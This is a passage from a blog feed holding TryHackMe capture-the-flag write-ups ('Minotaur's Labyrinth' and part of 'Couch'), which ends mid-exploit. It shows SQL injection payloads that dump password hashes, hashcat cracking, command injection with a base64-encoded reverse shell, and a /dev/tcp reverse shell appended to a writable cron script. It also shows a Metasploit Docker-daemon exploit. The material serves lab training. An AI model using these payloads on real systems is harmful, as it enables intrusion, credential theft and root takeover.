drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
226 Transfer complete
ftp&amp;gt; get message.txt
local: message.txt remote: message.txt
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (140.2193 kB/s)
ftp&amp;gt; cd .secret
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 pub
226 Transfer complete
ftp&amp;gt; cd pub
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 .
drwxr-xr-x   3 root     root         4.0k Jun 15 14:45 ..
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .secret
-rw-r--r--   1 root     root          141 Jun 15 14:57 message.txt
226 Transfer complete
ftp&amp;gt; get message.txt
local: message.txt remote: message.txt
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (140.2193 kB/s)
ftp&amp;gt; cd .secret
250 CWD command successful
ftp&amp;gt; ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4.0k Jun 15 19:49 .
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15 14:57 ..
-rw-r--r--   1 root     root           30 Jun 15 19:49 flag.txt
-rw-r--r--   1 root     root          114 Jun 15 14:56 keep_in_mind.txt
226 Transfer complete
ftp&amp;gt; get keep_in_mind.txt
local: keep_in_mind.txt remote: keep_in_mind.txt
200 PORT command successful
150 Opening BINARY mode data connection for keep_in_mind.txt (114 bytes)
226 Transfer complete
114 bytes received in 0.01 secs (12.2017 kB/s)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not much in there, I downloaded the message.txt and keep_in_mind.txt files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat message.txt keep_in_mind.txt 
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No credentials or anything that jumps out other than probably a cronjob being used somewhere that I should keep an eye out for. I turned my attention to the web ports and got a login prompt.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried the normal admin/admin, admin/password etc but nothing worked. Its never going to be that easy to get root by I did click the link and just got a page with the two creators.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/roottroll.png&quot; alt=&quot;roottroll&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The forget password link was also a troll!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/passwdtroll.png&quot; alt=&quot;passwdtroll&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had a look at the source but nothing jumped out expect a javascript file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/websource.png&quot; alt=&quot;websource&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great a username ‘Daedalus’! Also a basic password generating function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loginjs.png&quot; alt=&quot;loginjs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Rather than doing manually, I put the function in to a python script and got the users password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat pwdgen.py 

a = [&quot;0&quot;, &quot;h&quot;, &quot;?&quot;, &quot;1&quot;, &quot;v&quot;, &quot;4&quot;, &quot;r&quot;, &quot;l&quot;, &quot;0&quot;, &quot;g&quot;]
b = [&quot;m&quot;, &quot;w&quot;, &quot;7&quot;, &quot;j&quot;, &quot;1&quot;, &quot;e&quot;, &quot;8&quot;, &quot;l&quot;, &quot;r&quot;, &quot;a&quot;, &quot;2&quot;]
c = [&quot;c&quot;, &quot;k&quot;, &quot;h&quot;, &quot;p&quot;, &quot;q&quot;, &quot;9&quot;, &quot;w&quot;, &quot;v&quot;, &quot;5&quot;, &quot;p&quot;, &quot;4&quot;]

print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tried the username and generated password and was able to successfully login to the portal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/loggedin.png&quot; alt=&quot;loggedin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webpage has a simple search feature, the table looks like database columns and with the NMAP showing a SQL database its safe to assume this search function will query the database.&lt;/p&gt;

&lt;p&gt;I tested some basic queries and it appears the search function is vulnerable to SQLi. When I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt; character I got an error ‘No callback’ however if I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;';-- -&lt;/code&gt; I don’t get an error which indicates I’m completing the SQL command by commenting out the rest of the query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlitest.gif&quot; alt=&quot;sqlitest&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because of the output page at the bottom I assumed I could use UNION SELECT to get results from the database and display on the page. There are 3 columns on the page so I tried the UNION SELECT statement &lt;code class=&quot;highlighter-rouge&quot;&gt;' union select 1,2,3;-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqlidatabase.gif&quot; alt=&quot;sqlidatabase&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So far so good! From the drop down is People &amp;amp; Creatures so rather enumerating for other tables I decided to look at at the columns for these tables with the command&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name ='people';-- -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/tablecolumns.png&quot; alt=&quot;tablecolumns&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This provided the column names:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;idPeople&lt;/li&gt;
  &lt;li&gt;namePeople&lt;/li&gt;
  &lt;li&gt;passwordPeople&lt;/li&gt;
  &lt;li&gt;permissionPeople&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now with the query &lt;code class=&quot;highlighter-rouge&quot;&gt;'UNION SELECT 1,namePeople,passwordPeople from people;-- -&lt;/code&gt; I could get a list of the names and passwords.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/sqluserlist.png&quot; alt=&quot;sqluserlist&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also wanted to see the permissions to each person so did another query to get this information, there is probably a way to use group concat to put all the information on one line but I just did a second query.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/peoplepermission.png&quot; alt=&quot;peoplepermission&quot; /&gt;&lt;/p&gt;

&lt;p&gt;M!n0taur is an admin. I put all the names and password hashes in to a file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat peoplecreds 
Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e
Menekrates:0b3bebe266a81fbfaa79db1604c4e67f
Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b
Daedalus:b8e4c23686a3a12476ad7779e35f5eb6
M!n0taur:1765db9457f496a39859209ee81fbda4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 0 peoplecreds /usr/share/wordlists/rockyou.txt --username&lt;/code&gt; I can use hashcat to crack the hashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/crackedusers.png&quot; alt=&quot;crackedusers&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged out of the portal and back in with M!n0taur’s credentials and now had admin access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/adminpage.png&quot; alt=&quot;adminpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A new link is presented ‘Secret Stuff’, navigating to this page give us another input box but this time echoing what ever we enter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/echopage.png&quot; alt=&quot;echopage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I did some basic tests and using pipe &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; allowed me to get command injection. 
&lt;img src=&quot;/assets/images/minotaurslabyrinth/echotest.gif&quot; alt=&quot;echotest&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;With the ability to run commands on the target I tried to get a reverseshell back to my machine, however none of my payloads worked and I got the following message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/errormessage.png&quot; alt=&quot;errormessage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because I could execute commands, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt; and could see the echo.php page I was trying to exploit, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; to reach the source code and found a regex checking my input.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regex.gif&quot; alt=&quot;regex&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A good resource for testing regex is &lt;a href=&quot;https://regexr.com&quot;&gt;https://regexr.com&lt;/a&gt;, I put in the expression and could see a range of characters are being matched, all the reverse shell payloads were matching the expression.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/regexcompare.png&quot; alt=&quot;regexcompare&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So so get around this, I encoded my payload as base64, another great resource is &lt;a href=&quot;https://www.revshells.com&quot;&gt;https://www.revshells.com&lt;/a&gt;. Put in your IP and port and you can pick the type of reverse shell you want and then encode it with base64.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/genshell.png&quot; alt=&quot;genshell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used the python3 payload, once thing to note is the regex will check for &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; so your payload must not need padding once encoded to base64.&lt;/p&gt;

&lt;p&gt;Now with my payloaded encoded, I started a listener and on the echo page I entered &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;base64 string&amp;gt; | base64 -d | bash&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 41916
bash: /root/.bashrc: Permission denied
daemon@labyrinth:/opt/lampp/htdocs$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I finally had a shell!&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;While enumerating the machine I found a folder called ‘reminders’ which is not a standard folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/$ ls
ls
bin    home            lost+found  reminders  srv       usr
boot   initrd.img      media       root       swapfile  var
cdrom  initrd.img.old  mnt         run        sys       vmlinuz
dev    lib             opt         sbin       timers    vmlinuz.old
etc    lib64           proc        snap       tmp
daemon@labyrinth:/$ cd reminders
cd reminders
daemon@labyrinth:/reminders$ ls -lah
ls -lah
total 44K
drwxr-xr-x  2 root root 4,0K jún   15 17:25 .
drwxr-xr-x 26 root root 4,0K szept 20 08:42 ..
-rw-r--r--  1 root root  31K nov    7 14:36 dontforget.txt
daemon@labyrinth:/reminders$ date
date
2021. nov. 7., vasárnap, 14:36:07 CET
daemon@labyrinth:/reminders$ 
daemon@labyrinth:/reminders$ tail dontforget.txt
tail dontforget.txt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
dont fo...forge...ttt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The ‘dontforget.txt’ file is being regularly updated, thinking back at the text files from the FTP service there is probably a cron job running. Looking around the machine further I found a timers folder.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/reminders$ cd /timers
cd /timers
daemon@labyrinth:/timers$ ls
ls
timer.sh
daemon@labyrinth:/timers$ ls -lah timer.sh
ls -lah timer.sh
-rwxrwxrwx 1 root root 117 nov    7 14:38 timer.sh
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
daemon@labyrinth:/timers$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is the script adding entries to the text file in the reminders folder and we have full write access. So I appended another reverse shell now calling port 5555.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;daemon@labyrinth:/timers$ echo '/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
&amp;lt;h -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; timer.sh
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo &quot;dont fo...forge...ttt&quot; &amp;gt;&amp;gt; /reminders/dontforget.txt
/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/THMVPNIP/5555 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Started a listener and waiting for the script to run and got a shell as root!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 5555
listening on [any] 5555 ...
connect to [THMVPNIP] from (UNKNOWN) [10.10.68.118] 38120
bash: cannot set terminal process group (6018): Inappropriate ioctl for device
bash: no job control in this shell
root@labyrinth:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="medium" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Couch Write Up</title>
      <link href="https://darrynbrownfield.co.uk/couch" rel="alternate" type="text/html" title="Couch Write Up" />
      <published>2021-08-13T00:00:00+00:00</published>
      <updated>2021-08-13T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/couch</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/couch">&lt;p&gt;&lt;img src=&quot;/assets/images/couch/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/couch&quot;&gt;couch&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/_stuxnet&quot;&gt;stuxnet&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Although not required I added the machine IP to my host file so through out the write up I can use couch.thm for consistency. Once added I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial couch.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:57 BST
Nmap scan report for couch.thm (10.10.59.151)
Host is up (0.034s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1 Port open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Unless its a bruce force challenge im not going to get far with just that so I also ran a full port scan and found 1 additional port:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p- -oA nmap/allports couch.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:58 BST
Nmap scan report for couch.thm (10.10.59.151)
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5984/tcp open  couchdb

Nmap done: 1 IP address (1 host up) scanned in 26.86 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I did a final scan using the two ports and ran the -sC &amp;amp; -sV flags to run default scripts and enumerate version.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -p 22,5984 -sC -sV -oA nmap/targeted couch.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 14:59 BST
Nmap scan report for couch.thm (10.10.59.151)
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I had never heard of CouchDB so I opened up the web browser to ‘http://couch.thm:5984/’ and took a look.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/couch/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before trying to exploit the service I wanted to understand how it works so I used google to find the &lt;a href=&quot;https://docs.couchdb.org/en/stable/intro/tour.html&quot;&gt;documentation&lt;/a&gt;. From reading the documentation I saw /utils/ provided a web interface.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/couch/adminpage.png&quot; alt=&quot;adminpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With in the ‘secret’ folder I found a username and password.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;The user credentials provided SSH access to the machine and the user.txt flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh atena@couch.thm
atena@couch.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Aug 13 07:12:25 2021 from &amp;lt;Machine IP&amp;gt;
atena@ubuntu:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;While enumerating the machine I found two additional ports listening on the server 2375 and 38811.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;atena@ubuntu:~$ netstat -ano                                                                  
Active Internet connections (servers and established)                                         
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer         
tcp        0      0 0.0.0.0:5984            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:38811         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    324 10.10.59.151:22         &amp;lt;Machine IP&amp;gt;:54352       ESTABLISHED on (0.07/0/0) 
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:38711           0.0.0.0:*                           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Also when I checked running processes using &lt;code class=&quot;highlighter-rouge&quot;&gt;ps aux&lt;/code&gt;, I found docker was running using one of the ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root       813  0.0  6.5 524372 66484 ?        Ssl  06:52   0:01 /usr/bin/dockerd -H=fd:// -H=tcp://127.0.0.1:2375
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you check the bash history, you can see the user has a ran a docker command to start a docker container. Using this technique you can start a container with the root file system mounted and grab any file you wish.&lt;/p&gt;

&lt;p&gt;However, I wanted to do this one slightly differently. Imagine the user was unable to run docker commands, how else could we use the same technique? The below steps shows how to get the root flag by interacting directly with the service.&lt;/p&gt;

&lt;p&gt;I wanted to be able to interact with the port easily so I used SSH local port forwarding. A great &lt;a href=&quot;https://linuxize.com/post/how-to-setup-ssh-tunneling/&quot;&gt;article&lt;/a&gt; explains how to do this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh -L 2375:localhost:2375 atena@couch.thm                  
                                                                  
atena@couch.thm's password:                                       
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)
                                                                  
 * Documentation:  https://help.ubuntu.com                        
 * Management:     https://landscape.canonical.com                
 * Support:        https://ubuntu.com/advantage                   
Last login: Fri Aug 13 07:12:49 2021 from &amp;lt;Machine IP&amp;gt;             
atena@ubuntu:~$                                                   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I can interact with the port by going to ‘localhost:2375’. A great resource for tips and techniques is &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/2375-pentesting-docker&quot;&gt;HackTricks&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Remote API is running by default on 2375 port when enabled. The service by default will not require authentication allowing an attacker to start a privileged docker container. By using the Remote API one can attach hosts / (root directory) to the container and read/write files of the host’s environment.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If I had docker installed on my local machine I could use this to run docker commands on the remote service using the -H flag but I dont, we could also use CURL. However Metasploit is easier.&lt;/p&gt;

&lt;p&gt;I fired up Metasploit and searched docker.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; search docker

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/dcos_marathon                          2017-03-03       excellent  Yes    DC/OS Marathon UI Docker Exploit
   1   exploit/linux/local/docker_runc_escape                    2019-01-01       manual     No     Docker Container Escape Via runC Overwrite
   2   exploit/linux/http/docker_daemon_tcp                      2017-07-25       excellent  Yes    Docker Daemon - Unprotected TCP Socket Exploit
   3   exploit/linux/local/docker_daemon_privilege_escalation    2016-06-28       excellent  Yes    Docker Daemon Privilege Escalation
   4   exploit/linux/local/docker_privileged_container_escape    2019-07-17       normal     Yes    Docker Privileged Container Escape
   5   auxiliary/scanner/http/docker_version                                      normal     No     Docker Server Version Scanner
   6   exploit/windows/local/docker_credential_wincred           2019-07-05       manual     Yes    Docker-Credential-Wincred.exe Privilege Escalation
   7   exploit/multi/http/gitea_git_hooks_rce                    2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
   8   exploit/multi/http/gogs_git_hooks_rce                     2020-10-07       excellent  Yes    Gogs Git Hooks Remote Code Execution
   9   post/linux/gather/enum_containers                                          normal     No     Linux Container Enumeration
   10  post/linux/gather/checkcontainer                                           normal     No     Linux Gather Container Detection
   11  auxiliary/admin/mssql/mssql_idf                                            normal     No     Microsoft SQL Server Interesting Data Finder
   12  post/multi/gather/docker_creds                                             normal     No     Multi Gather Docker Credentials Collection
   13  exploit/linux/http/rancher_server                         2017-07-27       excellent  Yes    Rancher Server - Docker Exploit
   14  auxiliary/gather/saltstack_salt_root_key                  2020-04-30       normal     No     SaltStack Salt Master Server Root Key Disclosure
   15  exploit/linux/misc/saltstack_salt_unauth_rce              2020-04-30       great      Yes    SaltStack Salt Master/Minion Unauthenticated RCE
   16  exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce  2021-03-02       excellent  Yes    VMware View Planner Unauthenticated Log File Upload RCE


Interact with a module by name or index. For example info 16, use 16 or use exploit/linux/http/vmware_view_planner_4_6_uploadlog_rce

msf6 &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‘exploit/linux/http/docker_daemon_tcp’ looks perfect.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; use 2
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; set rhost localhost
rhost =&amp;gt; localhost
msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; set lhost tun0
lhost =&amp;gt; tun0
msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; show options

Module options (exploit/linux/http/docker_daemon_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CONTAINER_ID                   no        container id you would like
   DOCKERIMAGE   alpine:latest    yes       hub.docker.com image to use
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT         2375             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x64


msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I just run the exploit and get a shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; exploit
[*] Exploiting target {:address=&amp;gt;&quot;0.0.0.1&quot;, :hostname=&amp;gt;&quot;localhost&quot;}

[*] Started reverse TCP handler on &amp;lt;Machine IP&amp;gt;:4444 
[-] Failed to connect to the target
[-] Exploit aborted due to failure: unknown: Failed to connect to the target
[*] Exploiting target {:address=&amp;gt;&quot;127.0.0.1&quot;, :hostname=&amp;gt;&quot;localhost&quot;}
